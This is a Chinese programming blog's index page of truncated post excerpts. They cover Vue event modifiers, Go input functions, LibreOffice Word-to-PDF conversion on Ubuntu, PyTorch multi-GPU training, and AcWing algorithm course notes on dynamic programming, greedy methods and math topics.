stoppreventselfoncecapturepassivenative stop
阻止了事件冒泡，相当于调用了event.stopPropagation方法
&lt;div @click="shout(2)"&gt; &lt;button @click.stop="shout(1)"&gt;ok&lt;/button&gt; &lt;/div&gt; // 只输出1 prevent
阻止了事件的默认行为，相当于调用了event.preventDefault方法
&lt;form v-on:submit.prevent="onSubmit"&gt;&lt;/form&gt; self
只当在 event.target 是当前元素自身时触发处理函数
&lt;div v-on:click.self="doThat"&gt;...&lt;/div&gt; 使用修饰符时，顺序很重要；相应的代码会以同样的顺序产生。因此，用 v-on:click.prevent.self 会阻止所有的点击，而 v-on:click.self.prevent 只会阻止对元素自身的点击
once
绑定了事件以后只能触发一次，第二次就不会触发
&lt;button @click.once="shout(1)"&gt;ok&lt;/button&gt; capture
使事件触发从包含这个元素的顶层开始往下触发
&lt;div @click.capture="shout(1)"&gt; obj1 &lt;div @click.capture="shout(2)"&gt; obj2 &lt;div @click="shout(3)"&gt; obj3 &lt;div @click="shout(4)"&gt; obj4 &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; // 输出结构: 1 2 4 3 passive
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/579d46c61c0a874415933fe974124b09/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f14aa3280215fe65435f8b0f26b96c7/" rel="bookmark">
			格式化输入
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、golang不同输入语句的区别：
特点ScanScanlnScanf从控制台读取内容SscanSscanlnSscanf从指定字符串中读取内容FscanFscanlnFscanf从文本中读取内容特点在读取内容的时候不会关注换行在读取内容的时候, 遇到换行时结束以格式化的方式读取内容，遇到换行时结束 2、fmt.Scan(a ...interface{}) (n int, err error)：
Scan扫描从标准输入读取的文本，将连续的空格分隔值存储在连续的参数中，换行符算作空格。它返回成功扫描的项目数，如果小于参数的数量，则err将报告错误原因。例如：
package main import "fmt" func main() { var ( name string age int married bool ) fmt.Println("请输入姓名，年龄，是否已婚") //Scan可以接收多个参数，用户输入参数默认使用空格或者回车换行符分割输入设备传入的参数，直到接收所有的参数为止。 fmt.Scan(&amp;name, &amp;age, &amp;married) fmt.Println(name, age, married) } 注意： golang中使用"&amp;"获取score变量(要定义的变量，也就是变量名)的内存地址(即取变量内存地址的运算符)，通过键盘输入为score变量指向的内存地址赋初值。
3、func Scanln(a ...interface{}) (n int, err error)：
Scanln类似于Scan，但是如果遇到换行就停止扫描，并且在最后一项之后必须有换行符或者EOF。例如：
package main import "fmt" func main() { var ( name string age int married bool ) fmt.Println("请输入姓名，年龄，是否已婚") //可以接收多个参数，用户输入参数默认使用空格分割输入设备传入的参数，遇到回车换行符就结束接收参数 result, err := fmt.Scanln(&amp;name, &amp;age, &amp;married) fmt.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6f14aa3280215fe65435f8b0f26b96c7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/df794ef38b73e57cb2a8396c2f7eb2be/" rel="bookmark">
			使用 LibreOffice 将 word 转化为 pdf 并解决中文乱码问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、安装 LibreOffice
二、解决乱码问题
2.1 查看是否安装中文字体
2.2 准备字体
2.3 导入字体
2.4 验证
项目中有一个在线上传 word 并预览 pdf 报告的需求，因为项目部署在 ubuntu 上面，所以借助libreoffice 实现 word 转 pdf，然后使用 pdf.js 在线预览 pdf 文档。
一、安装 LibreOffice LibreOffice 腾讯镜像源下载地址：Index of /libreoffice/libreoffice/stable/
root@jt-test-web:~# wget https://mirrors.cloud.tencent.com/libreoffice/libreoffice/stable/7.4.4/deb/x86_64/LibreOffice_7.4.4_Linux_x86-64_deb.tar.gz root@jt-test-web:~# apt-get install -y libcairo.so* ibus root@jt-test-web:~# tar -zxvf LibreOffice_7.4.4_Linux_x86-64_deb.tar.gz root@jt-test-web:~# cd LibreOffice_7.4.4.2_Linux_x86-64_deb/DEBS/ root@jt-test-web:~/LibreOffice_7.4.4.2_Linux_x86-64_deb/DEBS# dpkg -i *.deb root@jt-test-web:~/LibreOffice_7.4.4.2_Linux_x86-64_deb/DEBS# ln -s /opt/libreoffice7.4/program/soffice /usr/bin/soffice 二、解决乱码问题 由于 linux 默认没有安装中文字体，所以导出有中文的文件会导致中文乱码。这里此次安装微软雅黑字体。
2.1 查看是否安装中文字体 # 显示为空表示没有安装中文字体 root@jt-test-web:~# fc-list :lang=zh 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/df794ef38b73e57cb2a8396c2f7eb2be/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/979b0866d971cd1860aa3e209951fe4d/" rel="bookmark">
			VisDrone转VOC、YOLO格式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.转YOLO，将下面代码文件放在YOLOv5文件夹下！
from utils.general import download, os, Path def visdrone2yolo(dir): from PIL import Image from tqdm import tqdm def convert_box(size, box): # Convert VisDrone box to YOLO xywh box dw = 1. / size[0] dh = 1. / size[1] return (box[0] + box[2] / 2) * dw, (box[1] + box[3] / 2) * dh, box[2] * dw, box[3] * dh (dir / 'labels').mkdir(parents=True, exist_ok=True) # make labels directory pbar = tqdm((dir / 'annotations').
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/979b0866d971cd1860aa3e209951fe4d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1d77dee2f5af0f0f2048a80cbda0989e/" rel="bookmark">
			table 嵌套table 让内部table高度填满外部的td
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需要在外层的父table增加属性style="height: 100%" 然后内部table增加style="height: 100%"才会生效。
这样的效果是内层的table会跟着外层的高度变化而变化，不是那种设置固定高度无法动态变化的写法。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fa23d5cfcabf4b1702fb05984bc4a0d8/" rel="bookmark">
			顽固程序的卸载？试试Microsoft自带的卸载工具
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、说明 电脑中有些程序比较难卸载，即使是在控制面板中也无法直接卸载，怎么办？
比如我在控制面板中卸载MySQL安装的所有程序时，到最后 MySQL Workbench 8.0 CE 始终无法卸载，控制面板卸载不了，因为卸载时提示需要 visual c++ 2019的xxx支持才能继续操作。。。。。。
最终使用微软自带的微软的故障排除程序MicrosoftProgram_Install_and_Uninstall.meta 才完美卸载，c
二、例子 卸载 MySQL Workbench 8.0 CE，使用控制面板卸载不掉
1、先下载微软的故障排除程序 MicrosoftProgram_Install_and_Uninstall.meta.diagcab 下载链接：微软的故障排除程序
2、安装 程序安装和卸载疑难解答程序 直接双击，然后点击下一步
我是在卸载时遇到了问题，点击 卸载
然后找到要卸载的程序即可，等待一会儿
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/04c2cb3d98852c023890593310bc4624/" rel="bookmark">
			数据结构-查找-思维导图&#43;小结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据结构-查找-思维导图 1 数据结构-第七章-查找-思维导图2 知识点小结3 补充 1 数据结构-第七章-查找-思维导图 数据结构-第七章-查找-思维导图缩略图展示如下图1所示：
图1 2 知识点小结 1、二叉排序树(BST)、平衡二叉树(AVL)、红黑树(RBT)时间复杂度如下。
二叉排序树(BST)平衡二叉树(AVL)红黑树(RBT)查找O( n )O( log2n)O( log2n )插入O( n )O( log2n )O( log2n )删除O( n )O( log2n )O( log2n ) 2、m阶B树、m阶B+树。
m阶B树m阶B+树类比二叉查找树的进化--&gt;m叉查找树分块查找的进化--&gt;多级分块查找 关键字与分叉n个关键字对应n+1个分叉（子树）n个关键字对应n个分叉 关键字对应子树个数结点中的n个关键字对应n+1棵子树结点中的n个关键字对应n颗子树关键字个数根结点的关键字数n∈[1，m-1]
其他结点的关键字数n∈[⌈m/2⌉-1，m-1]根结点的关键字数n∈[1，m]
其他结点的关键字数n∈[⌈m/2⌉，m]关键字是否重复在B树中，各结点中包含的关键字是不重复的在B+树中，叶结点包含全部关键字，非叶结点中出现过的关键字也会出现再叶结点中结点包含的信息B树的结点中都包含了关键字对应的记录的存储地址在B+树中，叶结点包含信息，所有非叶结点仅起索引作用，非叶结点中的每个索引项只含有对应子树的最大关键字和指向该子树的指针，不含有该关键字对应记录的存储地址查找方式不支持顺序查找。
查找成功时，可能停在任何一层结点，查找速度“不稳定” 支持顺序查找。
查找成功或失败都会到达最下一层结点，查找速度“稳定” 相同点除根结点外，最少⌈m/2⌉个分叉（确保结点不要太“空”）
任何一个结点的子树都要一样高（确保“绝对平衡”） 3 补充 图中涉及到的链接分别如下（以往文章链接）：
1、平衡二叉树-调整“不平衡”情况：数据结构-平衡二叉树示例
2、红黑树-红黑树插入结点情况：数据结构-红黑树插入结点示例
3、B树-B树删除结点情况：数据结构-B树删除结点示例
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/68d1aae1fad45e9b7a0ef9331c844586/" rel="bookmark">
			一个vue项目配置访问两个服务器地址
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一个项目，其中一个模块A是部署在同一个服务器不同端口，这个时候开发就需要配置不同的访问。开发环境的时候，同一个服务器：10.12.7.99，其中有一个模块A的接口代码部署在8899这个端口，而其他接口的代码部署在6090这个端口。
先看vue.config.js这个页面的配置
对 .env.development这个文件做出如下修改，因为其他接口地址前面都是'/prop-api'，而模块A的接口地址前面是'/v1'
对 .env.production这个文件做出如下修改，因为其他接口地址前面都是'/prop-api'，而模块A的接口地址前面是'/v1'
请求接口文件的相关代码，request.js是其他接口的请求文件。
请求接口文件的相关代码，request-proxy.js是模块A的接口的请求文件。
这里因为部署线上的时候他们又部署到相同的服务器地址端口了，所以在这里又改了下。
使用，不同的接口地址配置。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aed9f21aba1dbf44534a80a609b2ef14/" rel="bookmark">
			Pytorch并行训练方法-单机多卡
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简单方便的 nn.DataParallel DataParallel 可以帮助我们（使用单进程控）将模型和数据加载到多个 GPU 中，控制数据在 GPU 之间的流动，协同不同 GPU 上的模型进行并行训练（细粒度的方法有 scatter，gather 等等）。
DataParallel 使用起来非常方便，我们只需要用 DataParallel 包装模型，再设置一些参数即可。需要定义的参数包括：参与训练的 GPU 有哪些，device_ids=gpus；用于汇总梯度的 GPU 是哪个，output_device=gpus[0] 。DataParallel 会自动帮我们将数据切分 load 到相应 GPU，将模型复制到相应 GPU，进行正向传播计算梯度并汇总：
model = nn.DataParallel(model.cuda(), device_ids=gpus, output_device=gpus[0]) 值得注意的是，模型和数据都需要先 load 进 GPU 中，DataParallel 的 module 才能对其进行处理，否则会报错：
# 这里要 model.cuda() model = nn.DataParallel(model.cuda(), device_ids=gpus, output_device=gpus[0]) for epoch in range(100): for batch_idx, (data, target) in enumerate(train_loader): # 这里要 images/target.cuda() images = images.cuda(non_blocking=True) target = target.cuda(non_blocking=True) ... output = model(images) loss = criterion(output, target) .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aed9f21aba1dbf44534a80a609b2ef14/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/858982058cef8817ab7b1c4115b69980/" rel="bookmark">
			二分查找各种类型例题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		普通二分查找 二分法中left + (right - left) /2 就和 (left + right) / 2 的结果相同，但是有效防⽌了 left 和right 太⼤直接相加导致溢出。
int binarySearch(int[] nums, int target) { int left = 0; int right = nums.length - 1; // 注意 while(left &lt;= right) { int mid = left + (right - left) / 2; if(nums[mid] == target) return mid; else if (nums[mid] &lt; target) left = mid + 1; // 注意 else if (nums[mid] &gt; target) right = mid - 1; // 注意 } return -1; } 1、为什么 while 循环的条件中是 &lt;=，⽽不是 &lt;？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/858982058cef8817ab7b1c4115b69980/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a8b4c68a5e4ffc5f3593dbd5a3d9d921/" rel="bookmark">
			Acwing - 算法基础课 - 笔记（动态规划 · 一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 动态规划（一）0-1 背包完全背包多重背包分组背包 动态规划（Dynamic Programming，简称DP）章节 从两个角度进行讲解
常用的DP模型 背包问题 DP的不同类型 线性DP区间DP状态压缩DP树形DP计数类DP数位统计DP 动态规划没有代码模板，它更偏向数学，其比较核心的部分在于状态的表示和状态的转移。
共3小节，第一小节预计讲解背包问题。
动态规划（一） 什么是背包问题？
背包问题的本质是，给定一堆物品和一个背包，每个物品有 体积 和 价值两种属性，在一些限制条件下，将一些物品装入背包，使得在不超过背包体积的情况下，能够得到的最大价值。根据不同的限制条件，分为不同类型的背包问题。
0-1 背包 给定 N N N 个物品，和一个容量为 V V V 的背包，每个物品有2个属性，分别是它的体积 v i v_i vi​ （v for volume），和它的价值 w i w_i wi​（w for weight） ，每件物品只能使用一次（0-1背包的特点，每件物品要么用1次（放入背包），要么用0次（不放入背包）），问往背包里放入哪些物品，能够使得物品的总体积不超过背包的容量，且总价值最大。
DP问题，通常从2方面来思考：状态表示和状态计算
状态表示
从2方面考虑
集合（某一个状态表示的是哪一种集合）属性（这个状态存的是集合的什么属性） 集合的最大值集合的最小值集合中的元素个数 状态计算
状态转移方程。即集合的划分。比如对 f ( i , j ) f(i,j) f(i,j) ，考虑如何将其划分成若干个更小的子集合，而这些更小的子集合，又能划分为更更小的子集合。
集合的划分有2个原则：
不重：即不重复，某个元素不能既属于子集合A，又属于子集合B不漏：即不漏掉任一元素，某个元素不能不属于任何一个子集合。 通常需要满足不漏原则，而不重不一定需要满足。
比如对01背包，用状态 f ( i , j ) f(i,j) f(i,j) 来表示所有选法（选择哪些物品）的集合。并且 i i i， j j j 的含义是：只从前 i i i 个物品中进行选择， j j j 表示，选出来的总体积小于等于 j j j 。 f ( i , j ) f(i,j) f(i,j) 的值是最大的总价值。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a8b4c68a5e4ffc5f3593dbd5a3d9d921/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f0633143bd53525adf05051fb6fc4ed/" rel="bookmark">
			Acwing - 算法基础课 - 笔记（贪心 · 一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 贪心（一）区间问题区间选点最大不相交的区间数量区间分组区间覆盖 Huffman树 贪心（一） 贪心预计讲两节，所有算法问题中，贪心和DP是最难的，甚至贪心比DP还要难。一个贪心算法的正确性的证明通常是很难的。贪心也没有一个常规的套路，更没有代码模板。DP虽然没有代码模板，但它至少有常用的套路。
贪心这一章的几道例题，代码都非常短，讲课主要是以证明为主。
区间问题 区间选点 Acwing - 905. 区间选点
贪心问题，如果没什么思路的话，可以先随便试一下，然后举几个样例，来验证自己所试的方法是不是正确。
这道题可以按照如下的思路来考虑：
将每个区间按照右端点从小到大排序从前往后依次枚举每个区间 若当前区间中已经包含点，则跳过否则，选择当前区间的右端点 这个思路的原理是什么呢？因为区间是按照右端点从小到大排序的，所以在某个区间内选点的时候，只有选择右端点，才能尽可能的使得这个点覆盖掉后续更多的区间。
这种贪心的策略，实际就是在当前状态下，选择一个最优的，是比较短视的，每次都是在眼前的几种决策里，挑一个当前最小的。这种局部最优解，最终会得到一个全局最优解。
贪心这种只看局部的策略，只适用于函数存在一个波峰的情况，如下，只要一直求解局部最优，最终就会到达全局最优（类似于AI中的梯度下降）
而如果函数存在多个波峰，则用贪心只能求得局部最优，但无法求得全局最优，如下
下面证明一下上面贪心策略的正确性：
设按照上面的策略，选出的点数为cnt，问题的答案为ans。那么我们就是要证明cnt = ans。
在数学上有一个思路，若要证A = B，则可以先证A &gt;= B，再证 A &lt;= B，以此得出 A = B。即，用不等式来推导出等式。
首先，按照上面的策略选点完毕后，能保证每个区间都至少有一个点。因为我们会依次枚举每个区间，若当前区间包含点，就跳过，若不包含，就选一个点。所以最终每个区间都至少有一个点。也就是说，通过这个策略得到的，一定是一个合法的选点方案（每个区间内都至少包含一个点即为合法）。而问题的答案，就是全部合法方案中的最小值。所以我们能得出：ans &lt;= cnt
接着，我们换一种角度，按照上面的策略，什么时候会增加一个点呢？那就是从前往后枚举每个区间时，遇到了当前区间没有点这个分支条件时，才会实际上增加一个点。那我们通过上面的策略最终选出了cnt个点，也就是有cnt个区间走到了当前区间没有点这个分支上。而由于区间是按照右端点从小到大排序的，那么我们能从全部的区间中，抽取出cnt个区间，这cnt个区间从左到右依次排列，且两两不相交。
由于合法的方案，需要保证每个区间内都至少有一个点，所以，所有的合法方案，都必须要覆盖掉这cnt个两两不相交的区间，而覆盖掉这cnt个区间，至少需要cnt个点。所以，所有的合法方案的点数，都一定要大于等于cnt。而问题的解也是合法方案中的一种，所以它也要满足大于等于cnt。于是就有了：ans &gt;= cnt
根据ans &lt;= cnt 和 ans &gt;= cnt，我们就能得出 ans = cnt，该策略的正确性证毕。
该题题解如下：
#include &lt;iostream&gt; #include &lt;algorithm&gt; using namespace std; const int N = 1e5 + 10; int n; // 定义一个表示区间的结构体 struct Range { int l, r; // 重载运算符, 按照区间右端点排序 bool operator&lt; (const Range &amp;w) { return r &lt; w.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4f0633143bd53525adf05051fb6fc4ed/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c122cf9a70f8274cac45359878070a40/" rel="bookmark">
			Acwing - 算法基础课 - 笔记（动态规划 · 三）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 动态规划（三）数位统计DP状态压缩DP蒙德里安的梦想最短哈密顿路径 树形DP记忆化搜索 动态规划（三） 本节也是以例题讲解形式为主，主要包括了：数位统计DP，状态压缩DP，树形DP，记忆化搜索。
数位统计DP 计数问题
题目链接
给定两个数a和b，求解a和b之间的所有数字中0-9出现的次数。
比如a=10，b=13，则a和b之间共有4个数：
10，11，12，13
其中，0出现1次，1出现5次，2出现1次，3出现1次。
这道题更像是一道奥数问题，最重要的一步是：分情况讨论。
先考虑实现一个函数：count(n,x)，其表示在1到n中，x出现的次数（x是0-9）
那么，可以用类似前缀和的思想，来求解a到b中，x出现的次数：
count(b,x) - count(a-1,x)
那么先来看，求解count(n,1)，即1到n中，x=1出现的次数。
比如n是个7位的数字 abcdefg，我们可以分别求出1在每一位上出现的次数，然后做一个累加即可。
求1在第4位上出现的次数
即求解有多少个形如xxx1yyy的数字，恰好在1和abcdefg之间。
分情况讨论即可
当xxx取值是000到abc - 1之间，此时，第四位取1，后面3位yyy可以随便取（得到的数一定小于abcdefg）。
即，当xxx = 000 ~ abc - 1时，yyy = 000 ~ 999
一共是abc * 1000 种组合方式
当xxx恰好等于abc，此时又要分情况讨论
当d &lt; 1，此时abc1yyy &gt; abc0efg，此时的次数是0当d = 1，此时yyy只能取000 ~ efg，此时次数为efg + 1当d &gt; 1，此时abc1yyy，后面的yyy可以取任意值，即000 ~ 999，此时次数为1000 把上面全部的情况，累加起来，就是1出现在第四位的次数。
类似的，可以求解出1在任意一个位置上出现的次数，累加起来，就求出了1在每一位上出现的此时，即求解出了count(n,1)。
进一步，能够求解出count(n,x)
需要注意一下边界问题：当x=0时，不能有前导0，所以当x=0时，形如xxx0yyy，前面的xxx是从001到999，特别要注意前导0的 特判，当x=0时，循环不能从最高位开始，要从第二位开始。
放一个我认为比较好的题解：https://www.acwing.com/solution/content/52109/
这个题目可以看算法提高课数位DP章节的总结
#include &lt;iostream&gt; #include &lt;cmath&gt; using namespace std; // 获取一个数的位数 int get(int x) { int n = 0; while(x) n++, x /= 10; return n; } // 1~n 中, 数字 i 出现的次数 int cnt(int n, int i) { int d = get(n), res = 0; // 枚举每一个位, 统计 i 出现的次数 for(int j = 1; j &lt;= d; j++) { // abcdefg // 假设当前枚举的是d这个位置, l = abc , r = efg, dj = d int p = pow(10, j - 1), l = n / p / 10, r = n % p, dj = n / p % 10; // 若 i &gt; 0, 则 (000 ~ abc-1) * (000 ~ 999) if(i) res += l * p; // 若 i = 0, 则 (001 ~ abc-1) * (000 ~ 999) else res += (l - 1) * p; // 前3位是 abc 时, 看第四位 d 和 i 的相对大小关系 // 若 d &lt; i, 则这个位置不可能放 i 了, 此时次数为0 // 若 d = i, 则次数为 000 ~ efg, 共 efg + 1 次 // 若 d &gt; i, 则次数为 000 ~ 999 if(dj == i) res += r + 1; else if(dj &gt; i) res += p; } return res; } int main() { int a, b; while(cin &gt;&gt; a &gt;&gt; b, a) { if(a &gt; b) swap(a, b); for(int i = 0; i &lt;= 9; i++) printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c122cf9a70f8274cac45359878070a40/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c2c6aefada4de4f42bc300326a23dc9d/" rel="bookmark">
			Acwing - 算法基础课 - 笔记（基础算法 · 二）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 基础算法（二）高精度高精度加法高精度减法高精度乘法高精度除法 前缀和一维前缀和二维前缀和 差分一维差分二维差分 前缀和&amp;差分 小结一维二维 基础算法（二） 这节讲的是高精度，前缀和，和差分。
高精度 A + B：两个大整数相加A - B：两个大整数相减A × b：一个大整数乘一个小整数A ÷ b：一个大整数除以一个小整数 A × B 和 A ÷ B 见的不多，课程中没有讲。
大整数的存储：用一个数组来存大整数的每一位上的数。
这里将大整数的个位，存到数组的第一位，大整数的最高位，存到数组的最后一位，即采用小端序。
高精度加法 A + B
算法题目：Acwing-791: 高精度加法
高精度加法的流程，就是模拟人手动做加法的过程，将每一位依次相加，并带上前一位的进位。
// C++ #include &lt;iostream&gt; #include &lt;vector&gt; #include &lt;string&gt; using namespace std; vector&lt;int&gt; add(vector&lt;int&gt; &amp;a, vector&lt;int&gt; &amp;b) { int c = 0; // 进位 vector&lt;int&gt; res; for(int i = 0; i &lt; a.size() || i &lt; b.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c2c6aefada4de4f42bc300326a23dc9d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5332bf77fb2f2ef8adf27cf8b242c984/" rel="bookmark">
			Acwing - 算法基础课 - 笔记（数学知识 · 四）（补）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数学知识（四） 这一小节讲的是容斥原理和简单博弈论。
容斥原理 定义 最基本的，假设有3个两两相交的圆。那么三个圆所覆盖的面积大小为
S 1 + S 2 + S 3 − S 1 ∩ S 2 − S 2 ∩ S 3 − S 1 ∩ S 3 + S 1 ∩ S 2 ∩ S 3 S_1+S_2+S_3 - S_1 \cap S_2 - S_2 \cap S_3 - S_1 \cap S_3 + S_1 \cap S_2 \cap S_3 S1​+S2​+S3​−S1​∩S2​−S2​∩S3​−S1​∩S3​+S1​∩S2​∩S3​
如果是2个圆的话，那么其所覆盖的面积为
S 1 + S 2 − S 1 ∩ S 2 S_1 + S_2 - S_1 \cap S_2 S1​+S2​−S1​∩S2​
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5332bf77fb2f2ef8adf27cf8b242c984/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7300b822b4565fc70da41677d0975e7f/" rel="bookmark">
			Acwing - 算法基础课 - 笔记（数学知识 · 三）（补）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数学知识（三） 这一小节讲的是高斯消元，组合数。
高斯消元 高斯消元是用来解方程的，通常来说可以在 O ( n 3 ) O(n^3) O(n3) 的时间复杂度内，求出包含 n 个未知数的，n个方程的多元线性方程组的解。如下的方程组就称为多元线性方程组
a 11 x 1 + a 12 x 2 + . . . + a 1 n x n = b 1 a_{11}x_1+a_{12}x_2+...+a_{1n}x_n=b_1 a11​x1​+a12​x2​+...+a1n​xn​=b1​
a 21 x 1 + a 22 x 2 + . . . + a 2 n x n = b 2 a_{21}x_1+a_{22}x_2+...+a_{2n}x_n=b_2 a21​x1​+a22​x2​+...+a2n​xn​=b2​
a 31 x 1 + a 32 x 2 + .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7300b822b4565fc70da41677d0975e7f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e63524d9c134401788a4f1e7e9ae64a/" rel="bookmark">
			蓝桥杯基础2：BASIC-13试题 数列排序（c语言）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		资源限制
内存限制：512.0MB C/C++时间限制：1.0s Java时间限制：3.0s Python时间限制：5.0s
问题描述
给定一个长度为n的数列，将这个数列按从小到大的顺序排列。1&lt;=n&lt;=200
输入格式
第一行为一个整数n。
第二行包含n个整数，为待排序的数，每个整数的绝对值小于10000。
输出格式
输出一行，按从小到大的顺序输出排序后的数列。
样例输入
5
8 3 6 4 9
样例输出
3 4 6 8 9
采用了冒泡排序
#include &lt;stdio.h&gt; void BubbleSort(int A[],int n)//冒泡排序 { int i, j; int temp; for(i = 0; i &lt;= n-2; i++) //{这些括号可以省略 for (j = 0; j &lt;= n-2-i; j++) //{ if(A[j + 1] &lt; A[j]) { temp = A[j]; A[j] = A[j + 1]; A[j + 1] = temp; } // } //} } int main() { int A[200];//题目要求数列元素数目不能超过200 int i; int n; scanf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0e63524d9c134401788a4f1e7e9ae64a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b9068433c550731da5544df1f369bdc/" rel="bookmark">
			go的继承封装多态
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		博客主页：🏆看看是李XX还是李歘歘 🏆
🌺每天不定期分享一些包括但不限于计算机基础、算法、后端开发相关的知识点，以及职场小菜鸡的生活。🌺
💗点关注不迷路，总有一些📖知识点📖是你想要的💗
⛽️今天的内容是 go的继承封装多态，这里和java进行对比 ⛽️💻💻💻
目录
继承
Java
Go
封装
Java
Go
多态
Java
Go
继承 Java 通过子类和父类的关系实现，子类继承父类，则子类拥有父类所有非private的属性和方法。
方法重载：发生在同一个类中，在同一个类中处理不同数据的多个相同方法名的多态手段。
方法重写：发生在子类和父类之间，相对继承而言，子类中对父类已经存在的方法进行区别化的修改。
区别
1、重载发生在本类，重写发生在父类与子类之间；
2、重载的方法名必须相同，重写的方法名相同且返回值类型必须相同；
3、重载的参数列表不同，重写的参数列表必须相同。
Go 通过相应的结构体之间的组合来实现类似的继承效果。
package main import "fmt" type People struct { Name string Age int } type Student struct { People Score int } func main() { var lcc Student // people有两种初始化方法，lcc.People.Age和lcc.Name lcc.People.Age = 18 lcc.Name = "lichuachua" lcc.Score = 100 fmt.Println(lcc) //{{lichuachua 18} 100} } 封装 封装的内容包括函数、方法、变量。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1b9068433c550731da5544df1f369bdc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/96a09cda70f8b1652f5a8e39a74fe95f/" rel="bookmark">
			vue3 封装一个横向滚动条，不显示滚动条，但是可以用鼠标或者手指滚动，需兼容Mac等浏览器，并举例...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 可以在 Vue3 中使用自定义指令来封装横向滚动条。首先，在 main.js 中定义指令：
Vue.directive('horizontal-scroll', { bind(el, binding) { el.addEventListener('wheel', e =&gt; { if (e.deltaY) { el.scrollLeft += e.deltaY; } }); } }); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d6c0920b430bb0c683d01afcfc960519/" rel="bookmark">
			PIP安装python包，报ERROR: No matching distribution found for XXXXX 问题的处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PIP安装python包，报ERROR: No matching distribution found for XXXXX 问题的处理 最近在安装python包的时候老是报一个错误：
